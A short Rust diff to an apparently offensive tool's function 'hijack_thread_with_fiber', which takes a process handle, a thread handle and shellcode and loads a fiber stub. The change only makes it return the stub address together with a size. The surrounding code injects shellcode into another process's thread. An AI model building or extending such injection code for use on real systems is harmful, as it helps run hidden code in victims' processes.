@@ -167,7 +167,7 @@ pub unsafe fn hijack_thread_with_fiber(
     h_process: HANDLE,
     h_thread: HANDLE,
     shellcode: &[u8],
-) -> Result<*mut c_void> {
+) -> Result<(*mut c_void, usize)> {
     // load compiled fiber stub
     let fiber_stub_orig: &[u8] = include_bytes!("fiber_stub.bin");
     let mut fiber_stub = fiber_stub_orig.to_vec();
@@ -260,7 +260,7 @@ pub unsafe fn hijack_thread_with_fiber(
          let _ = PostThreadMessageA(tid, WM_NULL, windows::Win32::Foundation::WPARAM(0), windows::Win32::Foundation::LPARAM(0));
     }
 
-    Ok(stub_addr)
+    Ok((stub_addr, total_size))
 }
 
 // close process handle
